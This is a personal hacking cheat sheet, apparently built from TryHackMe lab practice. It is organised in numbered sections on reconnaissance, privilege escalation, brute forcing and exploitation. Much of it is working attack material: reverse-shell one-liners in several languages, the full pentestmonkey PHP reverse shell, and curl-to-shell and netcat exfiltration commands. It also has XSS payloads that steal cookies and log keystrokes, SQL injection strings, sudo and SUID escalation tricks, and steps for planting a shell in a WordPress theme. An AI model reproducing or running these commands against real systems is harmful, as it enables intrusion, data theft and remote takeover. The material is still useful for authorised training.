Provided by ;
	Name : Modeste Akaffou
	Username : Raphael D Jefe
	mail : modeste3109@gmail.com


mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm NOTES ABOUT HACKING mmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm

1- ## Databases, certificates, Subdomains
==========================================================
==> https://ui.ctsearch.entrust.com/ui/ctsearchui
==> https://crt.sh
==> site:*.tryhackme.com (Google Dorks)


2- ## Privilège escalation, sudo, root, user
==========================================================
==> https://gtfobins.github.io
==> https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
==> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
==> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
==> https://github.com/mzet-/linux-exploit-suggester
==> https://github.com/diego-treitos/linux-smart-enumeration
==> https://github.com/linted/linuxprivchecker
==> curl -k https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py --output suid3num.py && chmod 777 suid3num.py
==> wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py --no-check-certificate && chmod 777 suid3num.py


3- ## Search or find files, permission, privilege escalation, privesc
==========================================================
==> $ dir /s /b C:\*flag.txt (windows)
==> $ dir C:\ /s /b | findstr /i "flag.txt" (windows)
==> $ find / -perm -u=s -type f 2>/dev/null (SUID)
==> $ find / -user root -perm /4000 2>/dev/null
==> $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null  (SUID and GUID)
==> $ getcap -r / 2>/dev/null
	$ ./python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")' (EXPLOIT PYTHON BINARY)
==> $ grep -iRl text .
==> $ locate s3cr3t
==> $ find / -name s3cr3t 2>/dev/null
==> $ find / -type f -group users 2>/dev/null
==> $ grep -iRl cube /opt 2>/dev/null
==> $ grep -iRl cube /etc 2>/dev/null
==> $ grep -iRl cube /tmp 2>/dev/null
==> $ find / -user root -perm -o=x 2>/dev/null | grep -i "mike,backup,history,user'
==> $ find / -user elyana -type f 2>/dev/null

4- ## Host Discovery, Scanning, Port
===========================================================
==> $ nmap -sC -sV -p- -T4 --min-rate=9326 -vv 10.10.128.45
==> $ rustscan 10.10.193.118 -b 1000 -r 0-65535 -t 5000 -- -A
==> $ nmap -sT 10.10.235.68
==> $ nmap -sV -sC -A 10.10.231.52
==> $ nmap -A -sV -sC -T4 -p- --defeat-rst-ratelimit <victim IP address>
==> $ sudo nmap -A -sS -sV -sC -T4 -Pn --defeat-rst-ratelimit -script vuln -p 80,135,139,445,3389 10.10.24.149
==> $ sudo nmap -p- -n <machine ip>
==> $ nmap -Pn -sT -sV -sC 10.10.255.132


5- ## Reverse shell, Reshell, Bind shell, reverse shell filter bypass
===========================================================
==> $ <?php system($_GET['cmd']); ?>  (SCRIPT PHP)
==> $ bash -c 'sh -i >& /dev/tcp/10.11.74.83/1234 0>&1' (BASH)
==> $ bash -i >& /dev/tcp/10.11.74.83/1234 0>&1 (BASH)
==> $ /bin/bash/ -c 'bash -i >& /dev/tcp/10.11.74.83/4444 0>&1'
==> $ curl 10.8.2.58:8000/shell.sh | ba\sh
==> $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.74.83",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' (PYTHON)
==> $ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((« 10.11.74.83 »,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([« /bin/sh », »-i »]);' (PYTHON)
==> $ php -r '$sock=fsockopen("10.11.74.83",1234);exec("/bin/sh -i <&3 >&3 2>&3");' (PHP)
==> $ nc -e /bin/sh 10.11.74.83 1234 (NETCAT)
==> $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.74.83 1234 >/tmp/f (NETCAT)
==> $ r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.74.83 1234 >/tmp/f (NETCAT FILTER BYPASS WITH BACKSLASH)
==> $ whoami;php -r '$sock=fsockopen("your-vpn-ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
==> $ busybox nc 10.8.204.34 1234 -e sh
==> $ pwncat -l 4444 --self-inject /bin/sh:10.11.74.83:4445+3
==> $ require('child_process').exec('nc -e /bin/sh 10.11.74.83 1234')
==> $ require('child_process').exec('bash -c "sh -i >& /dev/tcp/10.11.74.83/1234 0>&1"')
==> $ 0<&196;exec 196<>/dev/tcp/10.11.39.30/4422; sh <&196 >&196 2>&196

==> https://ss64.com/bash/ (Linux command utilities) (RESOURCE)
==> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection (RESOURCE)
==> https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet(RESOURCE)
==> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
==> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php (PHP RESHELL)
-----------------------------------------------------------------------------
------------------ PHP REVERSE SHELL (RESHELL) ------------------------------
-----------------------------------------------------------------------------

<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.11.74.83';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}


	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

-----------------------------------------------------------------------------
-----------------------------------------------------------------------------
-----------------------------------------------------------------------------


6- ## Stabilized a shell
=============================================================
Method 1
==> $ python3 -c 'import pty;pty.spawn("/bin/bash")'
	$ python -c 'import pty;pty.spawn("/bin/bash")'
	$ Ctrl + Z
	$ stty raw -echo; fg
	$ export TERM=xterm
Method 2
==> $ rlwrap nc -lvnp <port>
	$ Ctrl + Z
	$ stty raw -echo; fg


7- ## Discovery directories, Enumeration
===================================================================
==> $ ffuf -w /usr/share/wordlists/common.txt -u http://10.10.193.118/FUZZ  (FFUZZ)
==> $ dirb http://10.10.193.118/ /usr/share/wordlists/common.txt  (DIRB)
==> $ gobuster dir --url http://10.10.193.118/ -w /usr/share/wordlists/common.txt  (GOBURSTER)
==> $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.97.98/island/2100 -t 40 -x ticket
==> $ dirb http://$ip/ /usr/share/wordlists/dirb/common.txt
==> $ dirb http://$ip/45kra24zxs28v3yd/ /usr/share/wordlists/dirb/common.txt
==> $ dirb http://exemple.com/ -X .php,.html,.txt -w /chemin/vers/wordlist.txt
==> $ gobuster dir -u http://10.10.4.113/ --wordlist=/usr/share/wordlists/big.txt
==> $ ffuf -w /usr/share/wordlists/big.txt -u http://10.10.202.173/hidden/FUZZ.{extension} -e .php,.html,.txt
==> $ ffuf -w /usr/share/wordlists/big.txt -u http://10.10.202.173/hidden/FUZZ
==> $ dirsearch dir -u team.thm/ -w /usr/share/wordlists/common.txt
==> $ feroxbuster --url http://10.10.219.37/ -w /usr/share/wordlists/big.txt -t 60 -C 404,403 (Deny list)
==> $ feroxbuster --url http://10.10.219.37/ -w /usr/share/wordlists/big.txt -t 60 -s 200 (Allow list)


7.1- ## WORDLISTS Directories, Enumeration
====================================================================
==> small.txt (959 lines)
==> common.txt (4686 lines)
==> big.txt (20469 lines) (Excellent)
==> directory-list (220560 lines) (Populaire)
FFUF >> GOBURSTER >> DIRB


8- ## Generate Password, etc shadow and passwd
====================================================================
==> $ mkpasswd -m sha-512 newpasswordhere
==> $ openssl passwd newpasswordhere
==> $ openssl passwd -6 -salt mysalt mypass


9- ## Google Dorks, Advanced search
====================================================================
==> site:tryhackme.com site:*.tryhackme.com
==> inurl:admin
==> filetype:pdf
==> intitle:admin
==> site:"reddit.com" intext:"THM" intitle:"tryhackme"
==> https://www.osintcurio.us/2019/12/20/google-dorks/
==> "Edinburgh Woollen Mill" street "corner"


10- ## Search subdomaines, Fuzzing, LFI enumeration, DNS enumeration
============================================================================
==> $ dnsrecon -t brt -d acmeitsupport.thm (DNSRECON)
==> site:*.tryhackme.com
==> $ sublist3r -d acmeitsupport.thm (SUBLIST3R)
==> $ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.227.223 (FFUZZ)
==> $ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt  -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.227.223 -fs 2395 (FFUZZ)
==> https://dnsdumpster.com
==> https://www.shodan.io/dashboard
==> $ gobuster dns -d stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -i
==> $ wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/wordlists/subdomains.txt
==> $ wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=FUZZ --hw=0
==> $ wfuzz -X POST -w /usr/share/wordlists/fourletters.txt --hh=45 http://10.10.16.166/api/items?FUZZ=oops
==> $ ffuf -u 'http://glitch.thm/api/items?FUZZ=noraj' -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -b 'token=this_is_not_real' -X POST -mc all -fc 400
==> $ ffuf -u http://10.10.140.40/api/items\?FUZZ=id -w /usr/share/wordlists/big.txt -fw 1 -X POST


11- ## Usernames enumeration, BruteForce, Login Page, ffuf, Fuzzing
==================================================================
==> $ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.88.92/customers/signup -mr "username already exists"


12- ## Brute Force, login page, ssh, smb, ftp, hydra, ffuzz
========================================================================
==> $ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.88.92/customers/login -fc 200
==> $ hydra -l username -P wordlist.txt server service (COMMAND)
==> $ hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.102.89 ftp (FTP)
==> $ hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.102.89 (FTP SAME AS PREVIOUS)
==> $ hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.102.89 ssh (SSH)
==> $ hydra -s 8080 -L $userfile -P $passfile $target_ip http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password' -f -vV -t 64 -o login_brute_force.txt (HTTP-POST-FORM)
==> $ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v (SMTP)
==> $ hydra -l pittman@clinic.thmredteam.com -P dict.lst smtps://10.10.172.43:465 -f -q (SMTPS)
==> $ hydra -l phillips -P clinic.lst 10.10.172.43 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f (HTTP-GET-FORM)
==> $ hydra -l burgess -P dict2.lst 10.10.172.43 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
==> $ Default credentials:
	admin:admin
	admin:password
	guest:guest
	admin:12345
==> $ hydra -l bob -P /data/src/wordlists/rockyou.txt -f 10.10.231.52 http-get /protected/
==> $ hydra -L userfow.txt -P passfow.txt pop3://10.10.193.216


13- ## Password Crack hash
========================================================================
==> $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -pot=pot1 (JOHN THE RIPPER)
==> $ john --wordlist=easypeasy.txt hash.txt --format=gost
==> $ hashcat -a 0 -m 3200 -o password.txt hash_lewis.txt /usr/share/wordlists/rockyou.txt (HASHCAT)
==> https://crackstation.net/
==> $ hashcat -m 1710 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt (with salt, hash.txt contains password:salt)
==> $ hashid -m hash.txt (Find hashcat type hash number)
==> $ hashcat --show hash.txt (Same as hashid)
==> $ hashcat -m 3200 --show hash.txt /usr/share/wordlists/rockyou.txt (View password already cracked save in pot)
==> https://hashcat.net/wiki/doku.php?id=example_hashes (Online hash type identifier)
==> $ grep -E '^.{4}$' /usr/share/wordlists/rockyou.txt | hashcat -m 3200 hash.txt -a 0 --force (Accelerate password cracking with password length)
==> https://md5hashing.net/hash (HASH, UNHASH)
==> https://md5hashing.net/hash_type_checker (HASH IDENTIFIER)


14- ## XSS, Cross-Site Scripting
========================================================================
==> <script>alert('XSS');</script> (TEST)
==> <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> (STEAL COOKIE)
==> <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script> (KEY LOGGER)
==> <script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script> (REVERSE SHELL)


15- ## Command Injection Payload list
==========================================================================
==> https://github.com/payloadbox/command-injection-payload-list

16- ## SQL Injection, in Bind, Blind, Out of bind
===========================================================================
==> 1 UNION SELECT 1
==> 1 UNION SELECT 1,2
==> 1 UNION SELECT 1,2,3
==> 0 UNION SELECT 1,2,3 (TEST NUMBERS OF COLUMS)
==> 0 UNION SELECT 1,2,database() (GET DATABASE NAME)
==> 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' (GET ALL TABLES NAME)
==> 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users' (GET ALL COLUMNS NAME FROM A TABLE)
==> 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users (GET INFORMATIONS FROM TABLES WITH COLUMNS NAME)
==> ' OR 1=1;-- (BYPASS BLIND SQL INJECTION)
==> admin' OR '1'='1

17- ## SSH Connection, Copy from remote server, Transfer, download
==============================================================================
==> $ sudo service ssh start (Start ssh service on local machine)
==> $ scp pentester@10.10.9.117:/home/pentester/* .  (Copy on local machine when being local machine)
==> $ $ scp credential.pgp tryhackme.asc raphael@10.8.204.34:/home/raphael/Desktop/TryHackMe/Tomghost (Copy on local machine when being remote machine)
==> $ tar cf - .firefox/ | nc 10.11.74.83 4444 (SEND)
==> $ nc -lvnp 4444 > firefox.tar (RECEIVE)
==> $ nc 10.10.237.8 4444 < /home/catlover/runme (SEND)
==> $ nc nc -lvnp 4444 > runme (RECEIVE)


18- ## Wget, Download file on linux or windows machine
==============================================================================
==>> powershell -c "Invoke-WebRequest -Uri 'http://10.8.204.34:8000/reverse_shell.exe' -OutFile 'C:\Windows\Temp\reverse_shell.exe'"

19- ## None
===============================================================================


20- ## GTFObins
===============================================================================
==> (tar) : $ printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
			$ echo "" > "--checkpoint-action=exec=sh shell.sh"
			$ echo "" >> --checkpoint=1
			$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
			$ /bin/bash -p (Y0u G3t Th3 Sh3ll)
==> (/bin/bash) : $ sudo -u#-1 /bin/bash (https://www.exploit-db.com/exploits/47502)
==> (wget) : $ sudo wget --post-file=/root/root_flag.txt http://10.8.204.34:1234
==> (vi) : $ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
		   :set shell=/bin/sh
		   :shell
==> (ALL, ALL) ALL : $ sudo su
==> (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh : $ sudo -u apaar /home/apaar/.helpline.sh
==> (uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker))
	: $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
==> (vi) : $ sudo vi -c ':!/bin/sh' /dev/null
==> (tail) : $ cd /tmp
			 $ echo "/bin/bash" > tail
			 $ chmod 777 tail
			 $ export PATH=/tmp:$PATH
			 $ /home/joe/live_log
			 $ cd /root
			 $ cat root.txt
==> (apt-get) : $ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
==> (iconv) : $ sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
==> (/usr/bin/xxd) : $ xxd /etc/shadow | xxd -r
==> (suid:/bin/bash) : $ /bin/bash -p
==> (suid:/bin/screen-4.5.0) : https://www.exploit-db.com/exploits/41154
==> (suid:doas) : $ doas -u root /bin/bash
				  $ doas openssl enc -in /root/root.txt


21- ## SSH Connection, Port forwarding, Generate key id_rsa and id_rsa.pub
===============================================================================
==> $ ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.224.159 -p 2222
==> $ ssh -f -N -L 1234:127.0.0.1:8080 aubreanna@internal.thm
==> $ ssh-keygen -f id_rsa (Generate id_rsa and id_rsa.pub) (1)
==> $ echo id_rsa.pub > .ssh/authorized_keys (2)
==> $ ssh -i id_rsa apaar@10.10.78.213 (3)
==> $ ssh -L 9001:127.0.0.1:9001 apaar@10.10.233.203 -i id_rsa (4)
==> $ ssh-keygen -t rsa -b 4096

==> Example RSA Private Key :
-----BEGIN RSA PRIVATE KEY----- 
Proc-Type: 4,ENCRYPTED 
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD 
-----END RSA PRIVATE KEY-----


22- ## SMB Client exploitation, download, upload, enum4linux
===============================================================================
==> $ smbmap -H 10.10.96.14 (Enumerate smb shares or smbclient)
==> $ smbclient -L 10.10.24.149 (Find all smbclient)
==> $ enum4linux 10.10.24.149 (Enum all infos about smb server)
==> $ smbclient //10.10.24.149/Anonymous (Connect to smbclient Anonymous)
==> \> get password.txt
==> \> put reverse_shell.aspx
==> \> mget *
==> $ enum4linux $ip  (export ip=10.10.124.78) (Enumeration smb)
==> $ smbclient //$ip/Anonymous (Connexion smb)
==> $ smbclient -L //$ip (Enumeration smb)
==> $ smbmap -u anonymous -H 10.10.117.62 (Enumeration smb)
==> $ crackmapexec smb 10.10.162.201 -u guest -p "" --shares (Enumeration smb)
==> $ crackmapexec smb 10.10.222.122 -u guest -p "" --rid-brute (Full enum smb)
==> $ lookupsid.py anonymous@10.10.162.201

23- ## Meterpreter command
=============================================================================
==> > getprivs
==> > sysinfo
==> > cat, ls, dir, type, shell
==> > hashdump


24- ## Credentials Wordpress Enumeration, Wordpress Exploitation
===========================================================================
==> $ wpscan --url http://10.10.196.79 -e (Find Users)
==> $ wpscan --url http://internal.thm/wordpress -e (Find Username)
==> $ wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt (Find Password)
==> $ wpscan --url 10.10.128.8 --usernames Elliot --passwords fsocity.dic -t 35
==> $ wpscan --url http://10.10.69.51/ -U philip,c0ldd,hugo -P /usr/share/wordlists/rockyou.txt
==> $ wpscan --url http://10.10.124.236/ -e u -P /usr/share/wordlists/rockyou.txt (Find Users and Bruteforce)
==> $ wpscan — url http://10.10.128.23/wordpress/ --enumerate u, ap
	  u : you will enumerate the users
	  ap : you will detect if there are some plugins (all-plugins)
___________________________________________________________________________
==> 1- Login with credentials
==> 2- Apparence > Editor > footer.php or header.php or 404.php
==> 3- Add php-reverse-shell from pentestmonkey
==> 4- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
==> 5- http://coldd.thm/wp-content/themes/twentyfifteen/header.php
==> 5- http://10.10.244.196/wordpress/wp-content/themes/twentytwenty/404.php
==> $ cd /var/www/html
==> $ cat wp-config.php



25- ## Resolution locale, DNS local, /etc/hosts, Domain name
==========================================================================
==> $ echo "10.10.161.146   internal.thm" | sudo tee -a /etc/hosts
==> $ sudo sh -c "echo '10.10.255.123   mafialive.thm' >> /etc/hosts"


26- ## Jenkins Reverse shell execution
==========================================================================
==> r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.204.34/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()


27- ## RDP Remote Desktop Protocol
===========================================================================
==> xfreerdp /u:admin /p:password /cert:ignore /v:10.10.108.125 /workarea /sec:rdp
==> [solve] https://www.mail-archive.com/kde-bugs-dist@kde.org/msg692243.html


28- ## FTP Connexion
============================================================================
==> $ ftp 10.10.157.89 10021
==> $ ftp 10.10.200.23 (Default port 21, default user Anonymous)
==> ftp> active (Pour activer le mode active)
==> ftp> passive (Pour activer le mode passive)
==> ftp> get filename (Download a file)
==> ftp> mget * (Download many files by entry "y" each time)
==> ftp> put shell.php (Upload file)
==> ftp> chmod 777 jefeshell.php
==> ftp> pwd
==> ftp> ls -la



29- ## Kali linux command
============================================================================
==> $ cat file1.txt file2.txt file3.txt > combined_list.txt
==> $ sort combined_list.txt | uniq -u > cleaned_combined_list.txt


30- ## Password generator
============================================================================
==> $ cewl -w list.txt -d 5 -m 5 http://thm.labs
	  -w will write the contents to a file. In this case, list.txt.
	  -m 5 gathers strings (words) that are 5 characters or more
	  -d 5 is the depth level of web crawling/spidering (default 2)
	  http://thm.labs is the URL that will be used
==> $ git clone https://github.com/therodri2/username_generator.git
==> $ john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst


31- ## DATABASE Connection, Command, mysql
============================================================================
==> $ mysql -u root -h food.thm -p (From local machine)
==> $ sudo service mysql status
==> $ sudo service mysql start
==> $ show databases; use users; select * from User;
==> $ msql -u root -p (From Remote Machine)
==> $ SHOW DATABASES;
==> $ USE webportal
==> $ SHOW TABLES;
==> $SELECT * FROM users;

32- ## Telnet connection
============================================================================
==> $ telnet 10.10.82.108 25

33- ## Command Injection Exploit, bypass filter, Blind Injection 
============================================================================
==> $ cat${IFS}/etc/passwd
==> $ ls${IFS}-la
==> $ ls$IFS-la$IFS/home/apaar/.ssh/
==> $ sudo tcpdump -i tun0 icmp

34- ## Steghide, Stegseek Extract data from IMG, PNG, JPEG
============================================================================
==> $ binwalk image.png (View if contains files)
==> $ binwalk -e image.png (Extract files from image)
==> $ steghide info image.png (Test if contains files with password)
==> $ steghide --extract -sf image.jpg (Ewtract files from image with password)
==> $ stegseek image.jpg /usr/share/wordlists/rockyou.txt (Bruteforce)
==> $ stegcracker image.jpg /usr/share/wordlists/rockyou.txt (Bruteforce)

35- ## PGP, GPG key, bruteforce
============================================================================
==> $ gpg2john tryhackme.asc > hash.txt (Extract hash from pgp private key)
==> $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
==> $ john --show hash.txt
==> $ gpg --import tryhackme.asc (import pgp private key)
==> $ gpg -d credential.pgp (Decrypt pgp file encrypted with password cracked)

36- ## Brainfuck programming, decoder
============================================================================
==> https://www.splitbrain.org/_static/ook/ (From brainfuck to text and inverse)

37- ## Repair broken image, Fix corrupted image
============================================================================
==> $ pcrt -v -f
==> https://github.com/sherlly/PCRT (PCRT (PNG Check & Repair Tool))

38- ## Symbolic link, permanent alias
============================================================================
==> $ sudo ln -s /ctf/stegsolve.jar /usr/bin/stegsolve
==> $ nano ~/.zshrc
	$ alias stegsolve='java -jar /usr/bin/stegsolve'
	$ alias pcrt='python2.7 /usr/bin/pcrt'
	$ source ~/.zshrc


39- ## Decode, Descrypt online
============================================================================
==> dcode.fr
==> cyberchef
==> https://www.rapidtables.com/
==> $ echo "ibase=10;obase=16;581695969015253365094191591547859387620042736036246486373595515576333693" | bc | xxd -r -p
	bc: a calculator utility that interprets the mathematical expression in Hex.
	ibase=10: sets the input base to decimal.
	obase=16: sets the output base to hexadecimal.
	xxd: is a utility that converts data in hexadecimal representation to binary and vice versa.
	-r: Reverse operation. Converts Hex to Binary
	-p: Plain hexdump style without line number display.


40- ## Cracking Zip, Fcrackzip
==========================================================================
==> $ fcrackzip -u -v -D -p ~/Wordlists/rockyou.txt backup.zip


41- ## Vulnerability analysis (Nikto, )
===========================================================================
==> $ nikto -h http://10.10.123.54:80
==> $ nikto -h http://10.10.123.54:1234/manager/html -id bob:bubbles


42- ## Searchsploit, Metasploit, Handler/Netcat, Metasploit Reverse shell
===========================================================================
Start Metasploit
----------------------------------
==> $ searchsploit tomcat manager
==> msf6> search tomcat manager
==> msf6> use 2
==> msf6> show options

Handler
-----------------------------------
==> msf6> use exploit/multi/handler
==> msf6> set payload windows/shell/reverse_tcp
==> msf6> set lhost tun0
==> msf6> set lport 1234
==> msf6> run


